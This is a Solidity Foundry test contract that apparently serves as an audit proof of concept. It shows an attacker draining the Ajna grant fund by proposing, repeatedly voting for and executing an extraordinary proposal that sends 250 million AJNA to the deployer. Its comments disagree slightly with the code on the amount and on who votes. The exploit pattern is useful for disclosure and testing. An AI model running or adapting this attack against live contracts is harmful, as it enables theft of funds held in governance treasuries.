// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import { Test } from "@std/Test.sol";

import { IExtraordinaryFunding } from "src/grants/interfaces/IExtraordinaryFunding.sol";
import { IAjnaToken }            from "../../utils/IAjnaToken.sol";

contract DrainGrantFund is Test{
    constructor(
        address ajnaToken,
        IExtraordinaryFunding grantFund,
        address[] memory tokenHolders // list of token holders that have voting power
    ) {
        // generate proposal targets
        address[] memory targets = new address[](1);
        targets[0] = ajnaToken;

        // generate proposal values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // generate proposal calldata, attacker wants to transfer 200 million Ajna to herself
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            msg.sender, // transfer ajna to this contract's deployer
            250_000_000 * 1e18
        );

        uint endBlock = block.number + 100_000;

        string memory description = "Extraordinary Proposal by attacker";

        // attacker creates and submits her proposal
        uint256 proposalId = grantFund.proposeExtraordinary(endBlock, targets, values, calldatas, description);

        // roll blocks forward to allow voting on the proposal at the start block the next block ahead
        vm.roll(block.number + 1);

        // attacker is going to make every token holder vote in favor of her proposal
        for (uint i = 0; i < tokenHolders.length; i++) {
            grantFund.voteExtraordinary(proposalId);
        }

        // execute the proposal, transferring the ajna to the attacker (this contract's deployer)
        grantFund.executeExtraordinary(targets, values, calldatas, keccak256(bytes(description)));
    }
}